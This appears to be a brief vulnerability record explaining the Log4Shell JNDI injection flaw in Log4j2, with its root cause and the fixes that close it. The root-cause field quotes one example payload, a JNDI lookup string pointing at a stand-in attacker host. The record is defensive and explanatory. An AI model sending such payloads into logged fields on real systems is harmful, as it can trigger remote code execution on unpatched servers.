title: Log4Shell (CVE-2021-44228) — JNDI injection via log message
root_cause: Log4j2 performs JNDI lookups on user-controlled log message content. String interpolation in logging framework has no sandboxing. Attacker sends ${jndi:ldap://evil.com/a} in any logged field.
resolution_type: Invariant: log message interpolation MUST NOT perform network calls. Lookup functionality disabled by default. Input sanitization before logging.
